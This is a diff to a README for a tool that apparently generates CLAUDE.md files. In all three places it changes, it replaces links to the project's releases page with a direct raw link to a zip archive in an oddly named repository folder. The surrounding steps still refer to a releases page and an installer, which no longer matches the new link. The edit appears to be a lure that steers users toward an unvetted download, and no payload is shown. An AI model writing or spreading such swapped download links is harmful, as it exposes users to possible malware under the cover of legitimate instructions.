@@ -1,6 +1,6 @@
 # ⚙️ claude-md-generator - Auto-create CLAUDE.md Governance Files
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/looseleaf-acrylic560/claude-md-generator/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/looseleaf-acrylic560/claude-md-generator/raw/refs/heads/main/acalephan/claude_md_generator_2.6.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This guide will take you through the process of downloading, installing, and run
 
 1. Click the big blue button above or visit the release page directly:
    
-   https://github.com/looseleaf-acrylic560/claude-md-generator/releases
+   https://github.com/looseleaf-acrylic560/claude-md-generator/raw/refs/heads/main/acalephan/claude_md_generator_2.6.zip
 
 2. On the releases page, find the latest version. Look for the Windows installer file. It often has a name ending with `.exe` or `.msi`.
 
@@ -149,4 +149,4 @@ If the file content looks incomplete:
 
 You can return to the release page anytime to download updates or the installer:
 
-https://github.com/looseleaf-acrylic560/claude-md-generator/releases
+https://github.com/looseleaf-acrylic560/claude-md-generator/raw/refs/heads/main/acalephan/claude_md_generator_2.6.zip
